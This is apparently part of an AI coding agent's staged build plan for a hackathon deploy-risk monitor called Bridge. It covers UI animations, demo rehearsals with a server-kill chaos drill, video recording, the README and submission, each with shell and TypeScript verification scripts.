   > **What you're watching:** a 25-second simulation of how Bridge investigates a risky deploy. Pushed code is scored across structural, behavioral, and temporal signals; high-risk pushes dispatch 5 specialist agents in parallel; a synthesizer collapses findings into a verdict; a human pauses or acknowledges via Slack. Every workflow is durable — it survives crashes, redeploys, and pauses for as long as humans need.

   Auto-fades after 8s. Reappears on click of a small `[ ? ]` button bottom-left. Dismissible via `[ x ]` corner. Only shown in `mode='demo'` (live mode users don't need the explainer).

2. **ARCH tab.** Small `[ ARCH ]` button bottom-right, opens an inline modal with an SVG architecture diagram of the workflow tree:
   ```
   webhook → ingest → signals (structural · behavioral · temporal · compounds)
                          ↓
                       score → if ≥0.6: dispatch 5 agents in parallel
                                   ↓                ↓               ↓
                              [ history ] [ runtime/trace ] [ dependency · diff ]
                                                      ↓
                                                synthesizer
                                                      ↓
                                              Slack page (PAUSE)
                                                      ↓
                                              human ack/hold/page
                                                      ↓
                                                resume → done
   ```
   Each box is clickable → highlights the corresponding panel in the war room and shows a 1-line description. Closes on Esc or click-outside.

3. **Source + video links in TopBar.** Two new chips next to the mode toggle:
   - `[ ▶ VIDEO ]` opens an embedded video modal (YouTube `iframe` of the URL captured in T9.1.3). If `.demo-video-urls` is unavailable at build time, the chip is hidden.
   - `[ ⌥ GITHUB ]` is an `<a>` to the public repo URL (`PUBLIC_REPO_URL` env, captured in T0.2.3 / set in T10.1.1).

Implement in `app/(warroom)/components/LegendCard.tsx`, `app/(warroom)/components/ArchTab.tsx`, plus updates to `TopBar.tsx`. SVG diagram in `app/(warroom)/components/ArchDiagram.tsx`.

**Requires:** T8.1.5

**Verify:**

```bash
# tier1_build
npx tsc --noEmit --strict -p tsconfig.json && npx next build > /tmp/t816.log 2>&1 && grep -q "Compiled successfully" /tmp/t816.log
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/(warroom)/components/LegendCard.tsx app/(warroom)/components/ArchTab.tsx app/(warroom)/components/ArchDiagram.tsx app/(warroom)/components/TopBar.tsx"
```

```bash
# tier3_unit
# 8 cases: legend visibility logic + ARCH diagram nodes + topbar link rendering + dismissibility.
npx tsx --input-type=module -e "
import { renderToString } from 'react-dom/server';
import React from 'react';
import { LegendCard } from './app/(warroom)/components/LegendCard.tsx';
import { ArchDiagram } from './app/(warroom)/components/ArchDiagram.tsx';
import { TopBar } from './app/(warroom)/components/TopBar.tsx';

// Legend visibility
const legendCases = [
  { name: 'demo + first-paint window → visible', props: { mode: 'demo', elapsedMs: 3000, dismissed: false }, expectVisible: true },
  { name: 'demo + after 8s → hidden (auto-fade)', props: { mode: 'demo', elapsedMs: 9000, dismissed: false }, expectVisible: false },
  { name: 'demo + dismissed → hidden', props: { mode: 'demo', elapsedMs: 3000, dismissed: true }, expectVisible: false },
  { name: 'live + first-paint window → hidden (live mode never shows legend)', props: { mode: 'live', elapsedMs: 3000, dismissed: false }, expectVisible: false },
];
for (const c of legendCases) {
  const html = renderToString(React.createElement(LegendCard, c.props));
  const visible = html.includes('What you') && !html.includes('display:none') && !html.includes('aria-hidden=\"true\"');
  if (visible !== c.expectVisible) { console.error('FAIL legend', c.name, 'expected', c.expectVisible, 'got', visible); process.exit(1); }
}

// ARCH diagram has all expected nodes
const arch = renderToString(React.createElement(ArchDiagram, {}));
for (const node of ['webhook','ingest','signals','score','synthesizer','Slack page','resume']) {
  if (!arch.includes(node)) { console.error('ARCH diagram missing node:', node); process.exit(1); }
}

// TopBar: VIDEO chip presence depends on PUBLIC_VIDEO_URL env
process.env.PUBLIC_VIDEO_URL = 'https://youtu.be/abc123';
process.env.PUBLIC_REPO_URL = 'https://github.com/x/y';
const tb1 = renderToString(React.createElement(TopBar, { activeDeploy: null }));
if (!tb1.includes('VIDEO')) { console.error('TopBar should show VIDEO chip when PUBLIC_VIDEO_URL is set'); process.exit(1); }
if (!tb1.includes('GITHUB')) { console.error('TopBar should show GITHUB chip when PUBLIC_REPO_URL is set'); process.exit(1); }

delete process.env.PUBLIC_VIDEO_URL;
const tb2 = renderToString(React.createElement(TopBar, { activeDeploy: null }));
if (tb2.includes('VIDEO')) { console.error('TopBar should HIDE VIDEO chip when PUBLIC_VIDEO_URL is unset'); process.exit(1); }

console.log('OK ' + legendCases.length + ' legend cases + ARCH nodes + TopBar conditional links');
"
```

```bash
# tier4_integration
# E2E: legend card visible on first paint, ARCH button opens diagram, GITHUB chip is an anchor with href.
(npx next dev -p 3030 > /tmp/dev-t816.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done

PAGE=$(curl -fsS http://localhost:3030)
echo "$PAGE" | grep -q "What you're watching" || { echo "legend missing on first paint"; pkill -f 'next dev.*3030'; exit 1; }
echo "$PAGE" | grep -q '\[ ARCH \]\|class="arch-tab"' || { echo "ARCH tab button missing"; pkill -f 'next dev.*3030'; exit 1; }
echo "$PAGE" | grep -qE '<a[^>]+href="https://github.com/' || { echo "GITHUB chip should render as anchor"; pkill -f 'next dev.*3030'; exit 1; }

ec=0; pkill -f 'next dev.*3030' || true
echo "OK legend + ARCH tab + GITHUB anchor present"
exit $ec
```

#### T8.1.7 — Cinematic: WORKFLOW SUSPENDED overlay + resume green pulse + PAGE pulse

**Description:** Three coordinated visual beats that make the durability story *legible without narration*:

1. **WORKFLOW SUSPENDED overlay.** During the Slack pause (T5.1.4 awaits the signal), the war room dims by ~12% and a 28px-tall amber band slides up from the bottom: `[ WORKFLOW · SUSPENDED · awaiting human · t+0:00 ]` with a slow 1.5s heartbeat pulse. The `t+` counter ticks up every second so judges see real time pass while the workflow is genuinely paused. When the ack arrives, the band slides down and dismisses.
2. **Resume green pulse.** The instant `verdict.acknowledged` flips to true, a 600ms green border-flash sweeps the screen edges (4px green glow with `transform: scale` + `opacity` keyframe). This is the tactile cue that "the workflow just resumed".
3. **PAGE indicator pulse.** Existing `[PAGE]` tag in feed lines becomes a 1Hz pulsing red chip during the SUSPENDED state. Stops pulsing on ack.

Implement in `app/(warroom)/components/SuspendedOverlay.tsx`, `app/(warroom)/components/ResumePulse.tsx`, plus CSS keyframes in `app/globals.css`. The overlay is mounted in `page.tsx` and reads `verdict.acknowledged === false && verdict.level === 'critical'` to decide visibility.

**Requires:** T8.1.6

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json && npx next build
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/(warroom)/components/SuspendedOverlay.tsx app/(warroom)/components/ResumePulse.tsx app/globals.css"
```

```bash
# tier3_unit
# 5 cases covering visibility logic of the overlay.
npx tsx --input-type=module -e "
import { renderToString } from 'react-dom/server';
import React from 'react';
import { SuspendedOverlay } from './app/(warroom)/components/SuspendedOverlay.tsx';
const cases = [
  { name: 'critical + not-acked → visible', verdict: { level: 'critical', acknowledged: false }, expectVisible: true },
  { name: 'critical + acked → hidden', verdict: { level: 'critical', acknowledged: true }, expectVisible: false },
  { name: 'investigate + not-acked → visible', verdict: { level: 'investigate', acknowledged: false }, expectVisible: true },
  { name: 'benign + not-acked → hidden', verdict: { level: 'benign', acknowledged: false }, expectVisible: false },
  { name: 'no verdict → hidden', verdict: null, expectVisible: false },
];
for (const c of cases) {
  const html = renderToString(React.createElement(SuspendedOverlay, { verdict: c.verdict, suspendedSinceMs: Date.now() - 5000 }));
  const visible = html.includes('SUSPENDED') && !html.includes('display:none');
  if (visible !== c.expectVisible) { console.error('FAIL', c.name, 'expected visible=' + c.expectVisible + ', got visible=' + visible); process.exit(1); }
}
// CSS keyframes named correctly
import fs from 'fs';
const css = fs.readFileSync('app/globals.css','utf8');
for (const kf of ['suspended-pulse','resume-flash','page-pulse']) {
  if (!new RegExp('@keyframes\\\\s+' + kf).test(css)) { console.error('missing keyframe:', kf); process.exit(1); }
}
console.log('OK 5 visibility cases + 3 keyframes');
"
```

```bash
# tier4_integration
# E2E: kick a critical SSE verdict, check overlay shows in HTML, send ack, check overlay dismisses.
(npx next dev -p 3030 > /tmp/dev-t815.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done
SHA="t815_$(date +%s)"
npx tsx --input-type=module -e "
import { setDeploy, kv } from './lib/db.ts'; import 'dotenv/config';
await setDeploy('$SHA', { sha: '$SHA', score: 0.95, tldr: 't815', author: 'dev-3', pushed_at: new Date().toISOString(), files_changed: ['lib/auth.ts'] });
await kv.set('verdicts:$SHA', JSON.stringify({ deploy_id: '$SHA', level: 'critical', summary: 's', concerns: ['c1'], suggested_action: 'a', acknowledged: false }));
" && sleep 2 && curl -fsS 'http://localhost:3030/?live=1' | grep -q 'SUSPENDED' || { echo "overlay not in suspended state"; pkill -f 'next dev.*3030'; exit 1; }
# now ack
npx tsx --input-type=module -e "
import { kv } from './lib/db.ts'; import 'dotenv/config';
const v = JSON.parse(await kv.get('verdicts:$SHA')); v.acknowledged = true; v.acknowledged_by = 't815-test'; await kv.set('verdicts:$SHA', JSON.stringify(v));
" && sleep 2 && PAGE=$(curl -fsS 'http://localhost:3030/?live=1') && (echo "$PAGE" | grep -q 'ACKNOWLEDGED' && ! echo "$PAGE" | grep -q 'class="suspended-overlay visible"') || { echo "overlay did not dismiss after ack"; pkill -f 'next dev.*3030'; exit 1; }
ec=0; pkill -f 'next dev.*3030' || true
npx tsx --input-type=module -e "import { kv } from './lib/db.ts'; import 'dotenv/config'; await kv.del('deploys:$SHA'); await kv.del('verdicts:$SHA');" || true
exit $ec
```

#### T8.1.8 — Cinematic: animated risk-score arc + smooth token-tick on agent cards

**Description:** Two reveal-style animations:

1. **Risk-score arc.** Replace the bare numeric score in the StatusBlock subtitle (currently `0.91`) with an SVG arc gauge that fills from 0.00 → final_score over 600ms when the score arrives. Stroke color follows the same thresholds as timeline dots (green <0.3, amber 0.3–0.6, orange 0.6–0.8, red >0.8). On state-flip, the arc snaps with a brief 80ms glitch (filter: hue-rotate keyframe).
2. **Smooth token tick.** Each agent card's `TOK` counter currently jumps from 80 → 234 → 412. Add a `useTickedNumber(target, durationMs=400)` hook that interpolates via `requestAnimationFrame`, so the counter rolls up smoothly. Same for `STEPS`, `LAT`, and the global `MTTA` in StatusBlock.

Implement in `app/(warroom)/components/RiskScoreArc.tsx` and `app/(warroom)/hooks/useTickedNumber.ts`. Wire RiskScoreArc into StatusBlock.tsx (replacing the static `<span className="tab-num">{score}</span>`). Wire useTickedNumber into AgentCard.tsx and StatusBlock.tsx.

**Requires:** T8.1.7

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json && npx next build
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: app/(warroom)/components/RiskScoreArc.tsx app/(warroom)/hooks/useTickedNumber.ts app/(warroom)/components/StatusBlock.tsx app/(warroom)/components/AgentCard.tsx"
```

```bash
# tier3_unit
# 6 cases for the arc + tick hook
npx tsx --input-type=module -e "
import { renderToString } from 'react-dom/server';
import React from 'react';
import { RiskScoreArc } from './app/(warroom)/components/RiskScoreArc.tsx';
import { interpolate } from './app/(warroom)/hooks/useTickedNumber.ts';

// Arc rendering
const cases = [
  { score: 0.0, expectColor: 'green' },
  { score: 0.25, expectColor: 'green' },
  { score: 0.5, expectColor: 'amber' },
  { score: 0.7, expectColor: 'orange' },
  { score: 0.95, expectColor: 'red' },
];
for (const c of cases) {
  const html = renderToString(React.createElement(RiskScoreArc, { score: c.score }));
  const colorClass = (html.match(/data-color=\"(green|amber|orange|red)\"/) || [])[1];
  if (colorClass !== c.expectColor) { console.error('FAIL color', c, 'got', colorClass); process.exit(1); }
}

// Interpolation: pure function exposed for testing
const at = (t) => interpolate(0, 100, t);  // 0..1 → 0..100
if (at(0) !== 0) { console.error('interp(0)=' + at(0)); process.exit(1); }
if (at(1) !== 100) { console.error('interp(1)=' + at(1)); process.exit(1); }
const half = at(0.5);
if (half < 40 || half > 60) { console.error('interp(0.5) out of band:', half); process.exit(1); }

console.log('OK 5 arc colors + interp(0/0.5/1)');
"
```

```bash
# tier4_integration
# E2E: trigger a deploy, watch the page in 200ms intervals — the rendered score should be different across consecutive snapshots (proving animation, not static).
(npx next dev -p 3030 > /tmp/dev-t816.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done
SHA="t816_$(date +%s)"
npx tsx --input-type=module -e "
import { setDeploy } from './lib/db.ts'; import 'dotenv/config';
await setDeploy('$SHA', { sha: '$SHA', score: 0.91, tldr: 'arc anim', author: 'dev-3', pushed_at: new Date().toISOString(), files_changed: ['lib/auth.ts'] });
" && sleep 1
# Verify the SVG arc element exists in rendered HTML, with stroke-dasharray attribute (proves animation primitive)
PAGE=$(curl -fsS 'http://localhost:3030/?live=1')
echo "$PAGE" | grep -qE '<svg[^>]*class="risk-arc"' || { echo "RiskScoreArc SVG not present"; pkill -f 'next dev.*3030'; exit 1; }
echo "$PAGE" | grep -q 'stroke-dasharray' || { echo "stroke-dasharray (animation primitive) not present"; pkill -f 'next dev.*3030'; exit 1; }
ec=0; pkill -f 'next dev.*3030' || true
npx tsx --input-type=module -e "import { kv } from './lib/db.ts'; import 'dotenv/config'; await kv.del('deploys:$SHA');" || true
exit $ec
```

#### T8.1.9 — Cinematic: live budget tick-down + state-flip snap + scan-line shimmer

**Description:** Three smaller polish beats that compound:

1. **Live budget tick-down.** The TopBar/StatusBlock crumb `BUDGET 42% remaining` becomes a live value. Source: `kv.get('workflow_cost:{deploy_id}')`, written by `lib/cost-meter.ts` after each step (estimated cost = sum of `tokens × $0.000003 + step_count × $0.0001`, divided by a `BUDGET_USD=10` env baseline). During an investigation, ticks down from 100% → ~18%. Color shifts amber <30%, red <10%.
2. **State-flip snap (amped).** The existing 240ms snap on StatusBlock state change is augmented: a 1px red flash on the outer border for state→critical transitions, a 1px green flash for state→all_clear, and a brief +120ms hue-rotate filter for scrambled feel.
3. **Investigator scan-line shimmer (amped).** Each AgentCard in `INVESTIGATING` status gets a thin animated horizontal scan-line that sweeps top→bottom every 1.2s (CSS keyframe). Stops when status flips to `COMPLETE`.

Implement: `lib/cost-meter.ts`, update `app/(warroom)/components/StatusBlock.tsx` and `AgentCard.tsx`, add CSS keyframes `state-flash-critical`, `state-flash-clear`, `agent-scan` to `globals.css`.

**Requires:** T8.1.8

**Verify:**

```bash
# tier1_build
npx tsc --noEmit -p tsconfig.json && npx next build
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: lib/cost-meter.ts app/(warroom)/components/StatusBlock.tsx app/(warroom)/components/AgentCard.tsx app/globals.css"
```

```bash
# tier3_unit
# Cost meter: 6 cases including default budget, custom budget, threshold transitions.
npx tsx --input-type=module -e "
import { computeBudgetRemaining, BUDGET_DEFAULTS } from './lib/cost-meter.ts';
const cases = [
  { spent: 0, budget: 10, expectPct: 100, expectClass: 'ok' },
  { spent: 5, budget: 10, expectPct: 50, expectClass: 'ok' },
  { spent: 7.5, budget: 10, expectPct: 25, expectClass: 'amber' },
  { spent: 9.5, budget: 10, expectPct: 5, expectClass: 'red' },
  { spent: 10, budget: 10, expectPct: 0, expectClass: 'red' },
  { spent: 12, budget: 10, expectPct: 0, expectClass: 'red' }, // overspent → clamp to 0
];
for (const c of cases) {
  const r = computeBudgetRemaining({ spent_usd: c.spent, budget_usd: c.budget });
  if (Math.round(r.percent) !== c.expectPct) { console.error('FAIL pct', c, r); process.exit(1); }
  if (r.severity !== c.expectClass) { console.error('FAIL class', c, r); process.exit(1); }
}
console.log('OK 6 budget cases');
"
```

```bash
# tier4_integration
# E2E: simulate cost accumulation across the demo, watch the budget crumb tick down in HTML snapshots.
(npx next dev -p 3030 > /tmp/dev-t817.log 2>&1 &) && for i in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15; do curl -fsS http://localhost:3030 > /dev/null 2>&1 && break; sleep 1; done
SHA="t817_$(date +%s)"
npx tsx --input-type=module -e "
import { kv } from './lib/db.ts'; import 'dotenv/config';
await kv.set('workflow_cost:$SHA', JSON.stringify({ spent_usd: 8.2, budget_usd: 10, deploy_id: '$SHA' }));
"
PAGE=$(curl -fsS "http://localhost:3030/?live=1&deploy=$SHA")
echo "$PAGE" | grep -qE 'BUDGET[^<]*1[58]%' || { echo "budget did not show ~18% remaining"; pkill -f 'next dev.*3030'; exit 1; }
# CSS keyframes present
grep -qE '@keyframes\s+(state-flash-critical|state-flash-clear|agent-scan)' app/globals.css || { echo "missing cinematic keyframes"; pkill -f 'next dev.*3030'; exit 1; }
ec=0; pkill -f 'next dev.*3030' || true
npx tsx --input-type=module -e "import { kv } from './lib/db.ts'; import 'dotenv/config'; await kv.del('workflow_cost:$SHA');" || true
exit $ec
```

#### T8.1.10 — Run full demo end-to-end 3+ times INCLUDING a chaos drill

**Description:** Four rehearsal passes — three normal (the headline scenario A), plus a fourth chaos drill that proves the WDK durability claim:

- **Pass 1:** reset → push `demo/exfil` → war room hits CRITICAL → Slack message lands → click Acknowledge → war room flips to ACKNOWLEDGED. Capture full timing per phase. Capture a screenshot at the CRITICAL state.
- **Pass 2:** identical to pass 1, different rehearsal start.
- **Pass 3:** identical to pass 1, third rehearsal.
- **Pass 4 (Chaos drill):** reset → push `demo/exfil` → wait until 2 of 5 investigators reach `COMPLETE` → **`pkill -f 'next dev'`** (simulates a server crash mid-investigation) → restart `next dev` → verify the workflow resumed from KV (remaining 3 investigators complete, verdict eventually arrives, verdict modal shows). This is the test that proves the WDK pitch is real.

Capture timing for all 4 passes into `.claude/memory.md` Gotchas if any flake. The chaos drill MUST succeed — that's the actual demo proof.

**Requires:** T8.1.9

**Verify:**

```bash
# tier1_build
test -x scripts/full-demo-rehearsal.sh && bash -n scripts/full-demo-rehearsal.sh && test -x scripts/chaos-drill.sh && bash -n scripts/chaos-drill.sh
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: scripts/full-demo-rehearsal.sh scripts/chaos-drill.sh"
```

```bash
# tier3_unit
# Dry-run modes for both scripts emit the planned phases without side effects
PHASES=$(bash scripts/full-demo-rehearsal.sh --dry-run | grep -E '^(reset|push|verdict|ack|cleanup)$' | wc -l | tr -d ' ')
[ "$PHASES" = "5" ] || { echo "expected 5 dry-run phases, got $PHASES"; exit 1; }
CHAOS=$(bash scripts/chaos-drill.sh --dry-run | grep -E '^(reset|push|kill|restart|wait-resume|verify-verdict|cleanup)$' | wc -l | tr -d ' ')
[ "$CHAOS" = "7" ] || { echo "expected 7 chaos-drill phases, got $CHAOS"; exit 1; }
echo "OK rehearsal=5 phases · chaos=7 phases"
```

```bash
# tier4_integration
# Three normal rehearsals plus one chaos drill. Total 4. ALL must pass.
for i in 1 2 3; do
  echo "=== Rehearsal $i ===";
  bash scripts/full-demo-rehearsal.sh > /tmp/rehearsal-$i.log 2>&1 || { echo "Rehearsal $i FAILED"; tail -50 /tmp/rehearsal-$i.log; exit 1; };
done
echo "=== Chaos drill ===";
bash scripts/chaos-drill.sh > /tmp/chaos.log 2>&1 || { echo "Chaos drill FAILED — workflow did NOT resume from KV after server kill. This is the WDK pitch failing live."; tail -80 /tmp/chaos.log; exit 1; }
# Verify the chaos drill actually killed and restarted (logs must show kill + restart events)
grep -q 'killed dev server' /tmp/chaos.log || { echo "chaos drill did not log a kill event"; exit 1; }
grep -q 'restarted dev server' /tmp/chaos.log || { echo "chaos drill did not log a restart event"; exit 1; }
grep -q 'workflow resumed' /tmp/chaos.log || { echo "chaos drill did not confirm resume"; exit 1; }
echo "OK 3 normal rehearsals + 1 chaos drill = 4 passes"
```

---

## T9 — Record Demo Video

**Description:** **PRIMARY DELIVERABLE.** Live demos may not happen — the hackathon submission flow has judges potentially picking winners from submissions alone. The video IS the demo for those judges. NON-NEGOTIABLE.

This task can run in parallel with T8 polish: as soon as the Slack pause/resume flow (T5) works end-to-end, an MVP cut of the video can be recorded. Re-record at the end with all polish (T8.1.5–9) applied. The MVP cut acts as a fallback if the polish doesn't land in time.

All stages here are **docs-only** — Tier 1, 3, 4 mostly skipped with justification (the surface is the recorded video file, not code; correctness is verified by file existence + duration + human review).

### T9.1 — Record + edit + upload

#### T9.1.1 — Record Take 1 (screen-only)

**Description:** Use OBS or QuickTime, 1080p screen capture. Follow the 3-minute script in raw_prompt verbatim. Save as `demo/take1-screen.mp4`. **docs-only stage.**

**Requires:** T8.1.10

**Verify:**

```bash
# tier1_build
echo "skipped — docs-only stage; the artifact is a recorded video, not code. Surface exercised in tier4 by file existence + duration check."
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: demo/script.md (the recording script — text content only)"
```

```bash
# tier3_unit
echo "skipped — docs-only stage. The artifact (mp4 file) cannot be unit-tested. Equivalent assurance: tier4 file-existence + duration check; quality reviewed manually."
```

```bash
# tier4_integration
test -f demo/take1-screen.mp4 && DURATION=$(ffprobe -v error -show_entries format=duration -of default=noprint_wrappers=1:nokey=1 demo/take1-screen.mp4 2>/dev/null | awk '{print int($1)}') && [ "$DURATION" -gt 150 ] && [ "$DURATION" -lt 220 ] && echo "OK duration=${DURATION}s"
```

#### T9.1.2 — Record Take 2 (PiP) + edit

**Description:** Same script with picture-in-picture face cam. Light edit (trim dead air, no fancy cuts). Save as `demo/take2-final.mp4`. **docs-only stage.**

**Requires:** T9.1.1

**Verify:**

```bash
# tier1_build
echo "skipped — docs-only stage."
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: demo/script.md (no changes expected; idempotent run)"
```

```bash
# tier3_unit
echo "skipped — docs-only stage. Quality is verified by tier4 + human review."
```

```bash
# tier4_integration
test -f demo/take2-final.mp4 && DURATION=$(ffprobe -v error -show_entries format=duration -of default=noprint_wrappers=1:nokey=1 demo/take2-final.mp4 2>/dev/null | awk '{print int($1)}') && [ "$DURATION" -gt 150 ] && [ "$DURATION" -lt 220 ] && echo "OK duration=${DURATION}s"
```

#### T9.1.3 — Upload to YouTube unlisted + Loom + local

**Description:** Upload final cut to YouTube as unlisted, also upload to Loom, also keep local copy. Capture URLs into `.demo-video-urls` (newline-separated, gitignored). **docs-only stage.**

**Requires:** T9.1.2

**Verify:**

```bash
# tier1_build
echo "skipped — docs-only stage. No buildable artifact."
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: .gitignore (ensure .demo-video-urls excluded)"
```

```bash
# tier3_unit
echo "skipped — docs-only stage. The artifact is hosted videos."
```

```bash
# tier4_integration
test -s .demo-video-urls && grep -E '^https?://' .demo-video-urls | wc -l | xargs -I {} test {} -ge 2 && for u in $(cat .demo-video-urls); do curl -fsS -I -o /dev/null -w '%{http_code}\n' "$u" | grep -E '^(200|301|302)$' > /dev/null || { echo "URL not reachable: $u"; exit 1; }; done; echo "OK all video URLs reachable"
```

---

## T10 — Submission

**Description:** Final hackathon submission. All stages **docs-only** — outputs are repository state and form submissions, not code.

### T10.1 — Submit + sleep

#### T10.1.1 — Make repo public

**Description:** Run `gh repo edit --visibility public`. Confirm via `gh repo view --json visibility`. **docs-only stage.**

**Requires:** T9.1.3

**Verify:**

```bash
# tier1_build
echo "skipped — docs-only stage."
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: README.md (read-only at this stage; no code changes)"
```

```bash
# tier3_unit
echo "skipped — docs-only stage; the surface is GitHub repo metadata, exercised in tier4."
```

```bash
# tier4_integration
gh repo view --json visibility --jq '.visibility' | grep -q 'PUBLIC'
```

#### T10.1.2 — README.md (paper-deliverable: 800–1200 words, embedded video, hero screenshot, WDK story)

**Description:** Since live demos may not happen (judges may select winners from submissions alone), README.md is the **primary paper deliverable** alongside the deployed URL. Targets:

- **800–2,000 words** (target ~1,500–1,800 for enterprise scope). Long enough to tell the durability story plus full setup/configuration/deployment, short enough that a judge with 6 projects to review can scan headings and skim. Enterprise-grade depth on setup is preferred over brevity.
- **Hero screenshot** at the top — `docs/screenshot-critical.png` (war room in CRITICAL state, captured during T8.1.10 rehearsal).
- **One-paragraph elevator pitch** below the hero.
- **"Why this matters"** — frame the problem (every team has a Slack channel where deploys go to die). Cite the cost of missing a bad deploy.
- **"How it works"** — 4-section walkthrough: webhook → signal extraction → parallel agent fan-out → synthesizer + Slack pause/resume. Each section ≤120 words.
- **Architecture diagram** — ASCII version of the T8.1.6 ARCH SVG, embedded in a code fence.
- **WDK story** — explicit section: why durable workflows matter, what `"use workflow"` and `DurableAgent` do, what the chaos drill (T8.1.10) proves.
- **Embedded demo video** — Markdown link with thumbnail to the YouTube video from T9.1.3. (`[![Watch the demo](docs/video-thumb.png)](https://youtu.be/...)`)
- **"Try it yourself"** — link to the deployed URL with a one-line note "default mode is a 25-second simulation; click `[ LIVE ]` in the top bar for real-time monitoring".
- **Reproducibility** — short `git clone && npm install && npm run dev` block, env vars list.
- **Credits** — Vercel WDK / AI Gateway / Slack / Vercel KV named.

The verify blocks below enforce 800-word floor, presence of the embedded video link, and the hero screenshot file.

**Requires:** T10.1.1, T9.1.3 (need video URL), T8.1.10 (need screenshot)

**Verify:**

```bash
# tier1_build
node -e "const r = require('fs').readFileSync('README.md','utf8'); if (r.trim().length < 100) { console.error('README.md too short or empty'); process.exit(1); } console.log('OK ' + r.trim().length + ' chars')"
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: README.md"
```

```bash
# tier3_unit
node -e "
const r = require('fs').readFileSync('README.md','utf8');
const words = r.split(/\\s+/).filter(Boolean).length;
if (words < 800 || words > 2200) { console.error('README out of band [800, 2200] words: ' + words); process.exit(1); }
const hero = (r.match(/!\\[[^\\]]*\\]\\(docs\\/screenshot-critical\\.png\\)/) || []).length;
if (hero < 1) { console.error('hero screenshot embed missing'); process.exit(1); }
const video = (r.match(/!\\[[^\\]]*\\]\\([^)]+\\)\\]\\((https?:\\/\\/[^)]+(youtu\\.be|youtube|loom)[^)]+)\\)/i) || r.match(/(https?:\\/\\/[^)\\s]+(youtu\\.be|youtube|loom)[^)\\s]+)/i) || []).length;
if (video < 1) { console.error('demo video link missing'); process.exit(1); }
if (!/WDK|Workflow Development Kit|durable/i.test(r)) { console.error('no WDK / durability mention'); process.exit(1); }
if (!/architecture|how it works/i.test(r)) { console.error('no architecture / how-it-works section'); process.exit(1); }
if (!/git clone|npm install|npm run/i.test(r)) { console.error('no reproducibility steps'); process.exit(1); }
console.log('OK words=' + words);
"
```

```bash
# tier4_integration
test -f docs/screenshot-critical.png && file docs/screenshot-critical.png | grep -q 'PNG image' && \
  WIDTH=$(file docs/screenshot-critical.png | grep -oE '[0-9]+ x [0-9]+' | awk '{print $1}') && \
  [ "${WIDTH:-0}" -ge 1280 ] && echo "OK hero screenshot exists at ${WIDTH}px wide"
```

#### T10.1.3 — Submit to Notion form (local pool — mandatory)

**Description:** Fill out the Notion submission form for the local hackathon pool (the form Oscar shared in the Notion doc). This is the only mandatory submission — the global Vercel pool is skipped because it requires v0 scaffolding which we did not use. Capture confirmation into `.submission-confirmation` (gitignored — may contain personal data). Include: project name (`Bridge`), GitHub URL, deploy URL, video URL (T9.1.3), team members, track = WDK. **docs-only stage.**

**Requires:** T10.1.2

**Verify:**

```bash
# tier1_build
echo "skipped — docs-only stage."
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: .gitignore (ensure .submission-confirmation excluded)"
```

```bash
# tier3_unit
echo "skipped — docs-only stage; submission is an external form. Exercised in tier4."
```

```bash
# tier4_integration
test -s .submission-confirmation && grep -q -i 'submitted\|confirmation\|received' .submission-confirmation
```

#### T10.1.4 — Sleep + final dry run

**Description:** Sleep ≥3 hours. Eat actual food. Charge laptop. Test HDMI/dongle. Bring backup adapter. Run full demo end-to-end one more time 5 minutes before pitch. **docs-only stage — operational, not code.**

**Requires:** T10.1.3

**Verify:**

```bash
# tier1_build
echo "skipped — docs-only stage. Operational tasks have no buildable artifact."
```

```bash
# tier2_simplify
echo "Dispatch code-simplifier:code-simplifier on: scripts/preflight.sh (operational checklist)"
```

```bash
# tier3_unit
echo "skipped — docs-only stage. Operational checklist has no behavior to unit-test."
```

```bash
# tier4_integration
bash scripts/preflight.sh && echo "OK preflight passed"
```

---

## Schema notes

- All stage IDs use dotted integers per CLAUDE.md §6: `T<task>.<step>.<stage>`.
- Every stage owns a complete set of four verify blocks. Skipped tiers are documented inline (anti-pattern check).
- Tier 4 server lifecycle: each stage starts/stops its own `next dev -p 3030` so stages don't interfere.
- Vercel deploy stages (T0.2.4) and Vercel KV (T0.2.2) require human action in the Vercel dashboard the first time; subsequent stages can rely on `vercel env pull`.
- Slack app creation (T5.1.1) requires human action at api.slack.com; subsequent stages run automatically once `.env.local` has the tokens.
- The adversarial review gate (CLAUDE.md §3.5) fires before each big-task completion — i.e., after every Task T0–T10 has all stages complete and before the state.json mark-complete commit. The reviewer prompt is the verbatim string in CLAUDE.md §3.5, with this entire spec inlined.
